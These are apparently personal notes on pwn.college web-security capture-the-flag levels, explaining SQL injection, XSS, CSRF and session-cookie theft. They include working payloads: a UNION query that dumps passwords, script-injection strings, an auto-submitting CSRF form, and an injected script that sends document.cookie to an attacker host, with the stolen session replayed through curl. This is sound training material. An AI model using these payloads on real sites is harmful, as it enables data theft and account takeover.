# Web Security
- *level 5*: we can only control `query` in `SELECT username FROM users WHERE username LIKE "{query}"`. By testing, `db.execute()` can not execute more than one separate statement at once. Use `UNION ALL` to combine the result of 2 statements, the SQL statement being executed is `SELECT username FROM users WHERE username LIKE "%" UNION ALL SELECT password FROM users; --"`
- *level 6*: this time, the table name is unknown (`table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"`). We can use a statement `SELECT name FROM sqlite_master WHERE type='table'` to figure out the table name. To know that the server is using `sqlite`, we can just cause some error, and see the error information, e.g., `sqlite3.OperationalError: ...`
- *level 7*: an obstable is that this time, it will finally finds a user using `rowid`, and only prints out the `username` column. We can use the error information to help us to figure out 1 byte of the flag each time. Specifically, the server will first select exact one user using `username` and `password`, if the query result is empty, there will be an error `Invalid 'username' or 'password'`, we can use something like this in our query `WHERE password LIKE ?`, the `?` can be something like `pwn.college{...%`, if the prefix exists, there won't be error because the query result is not empty. Otherwise, there will be an error. So we can start from `pwn.college{`, and each time, we guess 1 character, until we get ``pwn.college{...}`. Mind that `LIKE` is case-insensitive, we should instead use `GLOB`, which is case-sensitive
- *level 8*: cross-site scripting, inject a script to trigger an alert
- *level 9*: it puts our input into `<textarea></textarea>`, we can bypass it by using `</textarea><script>alert("x")</script><textarea>` as our input
- *level 10*: we need to get the user to visit `/leak`, and then we can get the flag by visiting `/info`
- *level 11*: cross site request forgery. When visiting `challenge.localhost:80/visit?url=...`, the server only accept `hacker.localhost` as host name in the `url`, so we cannot directly get the user to visit `/leak` to leak their password (the flag). Instead, we can use a `url=http://hacker.localhost:8776/redirect=http://challenge.localhost:80/leak` to redirect the user to the leaking page. Before this, we need to open a simple server `hacker.localhost` at port `8776`, use `python -m http.server 8776 --bind hacker.localhost`
- *level 12*: the request to `/leak` must be a POST request, this time we cannot directly redirect in the URL, instead, we can redirect at the (malicious) server side
    ```
    <script>
        function submitForm() {
            var form = document.createElement('form');
            form.method = 'POST'; // Set the method to POST
            form.action = 'http://challenge.localhost:80/leak';
            document.body.appendChild(form);
            form.submit();
        }
        window.onload = submitForm;
    </script>
    ```
- *level 13*: exploit a  XSS vulnerability to exfilitrate user session data. We can steal the session ID in the cookie, and send a request to `/info` with it. This time, I hosted the malicious script in a remote server, and get the server to run it by injecting `<script src="http://hacker.localhost:8776/hacker_script.js"></script>`, this script will visit the hacker's server with `document.cookie` as a parameter in the URL, so by inspecting the print out information on the hacker's server, we can figure out the session ID
    - `127.0.0.1 - - [15/Mar/2024 13:18:00] "GET /?cookie=session=eyJ1c2VyIjoxfQ.ZfRKiA.YIsk5t_9cSqsYhYhmJxsU5FTuS4 HTTP/1.1" 200 -`
    - `curl -b "session=eyJ1c2VyIjoxfQ.ZfRKiA.YIsk5t_9cSqsYhYhmJxsU5FTuS4" http://challenge.localhost:80/info?user=1`
- *level 14*: level 13 set `app.config['SESSION_COOKIE_HTTPONLY'] = False`, this will not prevent scripts to access the session cookie (so we can use `document.cookie` to get it). In this level, this setting is removed, so we will not be able to use previous method to get the session ID. The `/visit` page only return `Visited`, if we visit `/info` through `/visit`, we can use `/echo` to inject a script, and visit `/info` in that script, since the script is running on the server side, we don't need to know the session ID. Then, inside the script, we get the response from `/info`, although it will not be printed out, we can use the same method in level 13, visit the hacker's server and embed this result in the URL
